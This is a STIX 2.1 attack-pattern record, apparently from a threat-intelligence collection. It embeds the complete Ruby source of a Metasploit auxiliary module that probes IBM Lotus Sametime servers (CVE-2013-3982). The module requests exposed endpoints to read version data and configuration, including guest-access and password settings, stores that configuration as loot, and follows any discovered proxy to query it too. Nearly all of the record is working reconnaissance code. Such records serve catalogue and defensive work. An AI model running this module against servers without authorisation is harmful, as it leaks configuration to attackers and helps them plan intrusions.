{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3ef6e264-da19-4b66-92af-c8d34b74a407",
    "created": "2024-08-14T16:31:43.980058Z",
    "modified": "2024-08-14T16:31:43.980061Z",
    "name": "IBM Lotus Sametime Version Enumeration",
    "description": " This module scans an IBM Lotus Sametime web interface to enumerate the application's version and configuration information. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/ibm_sametime_version.rb",
            "external_id": "ibm_sametime_version.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-3982"
        },
        {
            "source_name": "reference",
            "url": "http://www-01.ibm.com/support/docview.wss?uid=swg21671201"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'uri'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  URLS = [\n      '/stmeetings/about.jsp',\n      '/stmeetings/serverversion.properties',\n      '/rtc/buildinfo.txt',\n      '/stmeetings/configuration?format=json&verbose=true'\n  ]\n\n  PROXY_URLS = [\n      '/stwebclient/i18nStrings.jsp',\n      '/stwebclient/communityserver',\n      '/stwebav/WebAVServlet?Name=WebPlayerVersion'\n  ]\n\n  JSON_KEYS = [\n    'communityRef',\n    'anonymousEnabled',\n    'calinteg.enabled',\n    'docshare.fileio.codebase',\n    'docshare.native.codebase',\n    'docshare.remote.url',\n    'meetingroom.allowGuestAccess',\n    'meetingroomcenter.allowGuestAccess',\n    'meetingroomcenter.customLoginPage',\n    'meetingroomcenter.enforceCSRFToken',\n    'meetingroomcenter.enforceHiddenRooms',\n    'meetingroomcenter.passwords',\n    'meetingserver.statistics.jmx.enabled',\n    'rtc4web.enforceNonce',\n    'userInfoRedirect',\n    'userInfoUrlTemplate',\n    'meetingroomcenter.stProxyAddress',\n    'meetingroomcenter.stProxySSLAddress'\n  ]\n\n  INFO_REGEXS = [\n    # section, key, regex\n    [ 'version', 'sametimeVersion', /lotusBuild\">Release (.+?)<\\/td>/i ],\n    [ 'api', 'meeting',  /^meeting=(.*)$/i ],\n    [ 'api', 'appshare', /^appshare=(.*)$/i ],\n    [ 'api', 'docshare', /^docshare=(.*)$/i ],\n    [ 'api', 'rtc4web', /^rtc4web=(.*)$/i ],\n    [ 'api', 'roomapi', /^roomapi=(.*)$/i ],\n    [ 'api', 'recordings', /^recordings=(.*)$/i ],\n    [ 'api', 'audio', /^audio=(.*)$/i ],\n    [ 'api', 'video', /^video=(.*)$/i]\n  ]\n\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'IBM Lotus Sametime Version Enumeration',\n      'Description' => %q{\n        This module scans an IBM Lotus Sametime web interface to enumerate\n        the application's version and configuration information.\n      },\n      'Author'         =>\n        [\n          'kicks4kittens' # Metasploit module\n        ],\n      'References' =>\n        [\n          [ 'CVE', '2013-3982' ],\n          [ 'URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg21671201']\n        ],\n      'DefaultOptions' =>\n        {\n          'SSL' => true\n        },\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => '2013-12-27'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptString.new('TARGETURI', [ true,  \"The path to the Sametime Server\", '/']),\n        OptBool.new('QuerySametimeProxy', [ true,  \"Automatically query Sametime proxy if found\", true]),\n        OptBool.new('ShowVersions', [ true,  \"Display Version information from server\", true]),\n        OptBool.new('ShowConfig', [ true,  \"Display Config information from server\", true]),\n        OptBool.new('ShowAPIVersions', [ true,  \"Display API Version information from server\", false])\n      ])\n\n    register_advanced_options(\n      [\n        OptBool.new('StoreConfigs', [ true,  \"Store JSON configs to loot\", true])\n      ])\n\n  end\n\n  def check_url(url, proxy='')\n\n    cgi_options = {\n      'uri' => normalize_uri(target_path, url),\n      'method' => 'GET'\n    }\n\n    if proxy.empty?\n      checked_host = datastore['RHOST']\n    else\n      checked_host = proxy\n      cgi_options.merge!({\n        'rhost' => proxy, # connect to Sametime Proxy\n        'vhost' => proxy  # set appropriate VHOST\n      })\n    end\n\n    vprint_status(\"Requesting \\\"#{checked_host}:#{rport}#{normalize_uri(target_uri.path, url)}\\\"\")\n    res = send_request_cgi(cgi_options)\n\n    if res.nil?\n      print_status(\"#{checked_host}:#{rport} - Did not respond\")\n      return\n    elsif res.code == 403\n      print_status(\"#{checked_host}:#{rport} - Access Denied #{res.code} #{res.message}\")\n      return\n    elsif res.code != 200\n      print_error(\"#{checked_host}:#{rport} - Unexpected Response code (#{res.code}) received from server\")\n      return\n    end\n\n    if url.include?('WebAVServlet')\n      # special handler for WebAVServlet as body is JSON regardless of content-type\n      begin\n        res_json = JSON.parse(res.body)\n      rescue JSON::ParserError\n        print_error(\"#{checked_host}:#{rport} - Unable to parse JSON response\")\n      end\n      extract_webavservlet_data(res_json)\n    elsif res['content-type'].include?(\"text/plain\") or res['content-type'].include?(\"text/html\")\n      extract_data(res.body, url)\n    elsif res['content-type'].include?(\"text/json\") or res['content-type'].include?(\"text/javaScript\")\n      begin\n        res_json = JSON.parse(res.body)\n      rescue JSON::ParserError\n        print_error(\"#{checked_host}:#{rport} - Unable to parse JSON response\")\n      end\n      # store configuration files as loot\n      store_config(url, res_json, checked_host) if datastore['StoreConfigs']\n      extract_json_data(res_json)\n    end\n  end\n\n  # extract data from WebAVServlet\n  def extract_webavservlet_data(res_json)\n    # stwebav/WebAVServlet --> WebPlayer information\n    if res_json['Softphone']\n      @version_info['version']['Softphone'] = res_json['Softphone']\n    end\n\n    if res_json['WebPlayer']\n      @version_info['version']['WebPlayer'] = res_json['WebPlayer']\n    end\n  end\n\n  def extract_data(data, url)\n    # extract data from response\n    INFO_REGEXS.each do |regex|\n      if data =~ regex[2]\n        @version_info[regex[0]][regex[1]] = $1.chomp\n      end\n    end\n\n    if url.include?('buildinfo.txt') and data =~ /^(\\d{8}-\\d+)$/\n      @version_info['version']['buildinfo'] = $1.chomp\n    end\n\n    if data =~ /aboutBoxProductTitle\":\"(.*?)\",/i\n      @version_info['version']['sametimeVersion'] = $1.chomp unless @version_info['version']['sametimeVersion']\n    end\n  end\n\n  # extract data from JSON response\n  def extract_json_data(json)\n    JSON_KEYS.each do |k|\n      @version_info['conf'][k] = json[k] if json[k]\n    end\n  end\n\n  def report\n    if @version_info['version']['sametimeVersion']\n      print_line\n      print_good(\"#{@version_info['version']['sametimeVersion']} Detected\")\n    else\n      print_line\n      print_status(\"IBM Lotus Sametime information\")\n    end\n\n    # configure tables\n    version_tbl = Msf::Ui::Console::Table.new(\n      Msf::Ui::Console::Table::Style::Default,\n      'Header'  => \"IBM Lotus Sametime Information [Version]\",\n      'Prefix'  => \"\",\n      'Indent'  => 1,\n      'Columns'   =>\n      [\n        \"Component\",\n        \"Version\"\n      ])\n\n    conf_tbl = Msf::Ui::Console::Table.new(\n      Msf::Ui::Console::Table::Style::Default,\n      'Header'  => \"IBM Lotus Sametime Information [Config]\",\n      'Prefix'  => \"\",\n      'Indent'  => 1,\n      'Columns'   =>\n      [\n        \"Key\",\n        \"Value\"\n      ])\n\n    api_tbl = Msf::Ui::Console::Table.new(\n      Msf::Ui::Console::Table::Style::Default,\n      'Header'  => \"IBM Lotus Sametime Information [API]\",\n      'Prefix'  => \"\",\n      'Indent'  => 1,\n      'Columns'   =>\n      [\n        \"API\",\n        \"Version\"\n      ])\n\n    # populate tables\n    @version_info['version'].each do | line |\n      version_tbl << [ line[0], line[1] ]\n    end\n\n    @version_info['conf'].each do | line |\n      conf_tbl << [ line[0], line[1] ]\n    end\n\n    @version_info['api'].each do | line |\n      api_tbl << [ line[0], line[1] ]\n    end\n\n    # display tables\n    print_good(\"#{version_tbl.to_s}\") if not version_tbl.to_s.empty? and datastore['ShowVersions']\n    print_good(\"#{api_tbl.to_s}\") if not api_tbl.to_s.empty? and datastore['ShowAPIVersions']\n    print_good(\"#{conf_tbl.to_s}\") if not conf_tbl.to_s.empty? and datastore['ShowConfig']\n\n    # report_note\n    report_note(\n      :host  => rhost,\n      :port  => rport,\n      :proto => 'http',\n      :ntype => 'ibm_lotus_sametime_version',\n      :data  => @version_info['version']['sametimeVersion']\n    ) if @version_info['version']['sametimeVersion']\n  end\n\n  def store_config(url, config_to_store, checked_host)\n    # store configuration as loot\n    unless config_to_store.empty?\n      loot = store_loot(\n        \"ibm_lotus_sametime_configuration_\" + url,\n        \"text/json\",\n        datastore['rhost'],\n        config_to_store,\n        \".json\"\n      )\n      print_good(\"#{checked_host} - IBM Lotus Sametime Configuration data stored as loot\")\n      print_status(\"#{checked_host}#{normalize_uri(target_uri.path, url)}\\n => #{loot}\")\n    end\n  end\n\n  def target_path\n    normalize_uri(target_uri.path)\n  end\n\n  def proxy?\n    @version_info['conf']['meetingroomcenter.stProxyAddress'] or @version_info['conf']['meetingroomcenter.stProxySSLAddress']\n  end\n\n  def use_proxy?\n    datastore['QuerySametimeProxy']\n  end\n\n  def proxy_ssl?\n    @version_info['conf']['meetingroomcenter.stProxySSLAddress']\n  end\n\n  def run\n    # create storage for extracted information+\n    @version_info = {}\n    @version_info['version'] = {}\n    @version_info['conf'] = {}\n    @version_info['api'] = {}\n\n    print_status(\"Checking IBM Lotus Sametime Server\")\n    URLS.each do | url |\n      check_url(url)\n    end\n\n    if proxy? and use_proxy?\n      # check Sametime proxy if configured to do so\n      if proxy_ssl? and ssl\n        # keep using SSL\n        proxy = URI(@version_info['conf']['meetingroomcenter.stProxySSLAddress']).host\n      else\n        proxy = URI(@version_info['conf']['meetingroomcenter.stProxyAddress']).host\n      end\n\n      print_good(\"Sametime Proxy address discovered #{proxy}\")\n\n      PROXY_URLS.each do | url |\n        check_url(url, proxy)\n      end\n    elsif proxy?\n      print_status(\"Sametime Proxy address discovered, but checks disabled\")\n    end\n\n    report unless @version_info.empty?\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-12-27"
}